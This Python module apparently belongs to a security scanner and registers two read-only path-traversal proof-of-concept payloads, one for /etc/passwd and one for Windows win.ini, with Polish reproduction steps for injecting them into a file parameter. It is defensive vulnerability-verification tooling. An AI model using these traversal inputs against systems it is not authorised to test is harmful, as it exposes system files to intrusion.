"""Safe path-traversal PoC payloads — Epic 4, Story 4.10.

Read-only traversal to well-known files that demonstrates escaping the intended
directory without altering anything.
"""

from app.services.security_scan.poc_payloads.registry import PayloadTemplate, register

_VULN = "path_traversal"

register(
    _VULN,
    PayloadTemplate(
        label="unix-passwd",
        payload="../../../../etc/passwd",
        reproduction_steps=(
            "1. Znajdź parametr wskazujący ścieżkę/nazwę pliku (np. ?file=).",
            "2. Wprowadź: ../../../../etc/passwd",
            "3. Obserwuj, czy zwracana jest zawartość pliku spoza katalogu bazowego.",
        ),
        expected_effect="Aplikacja zwraca /etc/passwd — dowód wyjścia poza dozwolony katalog (tylko odczyt).",
    ),
)

register(
    _VULN,
    PayloadTemplate(
        label="windows-hosts",
        payload="..\\..\\..\\..\\windows\\win.ini",
        reproduction_steps=(
            "1. Znajdź parametr ścieżki na hoście Windows.",
            "2. Wprowadź: ..\\..\\..\\..\\windows\\win.ini",
            "3. Obserwuj, czy zwracana jest zawartość pliku systemowego.",
        ),
        expected_effect="Aplikacja zwraca win.ini — dowód traversal na Windows (tylko odczyt, plik nieszkodliwy).",
    ),
)
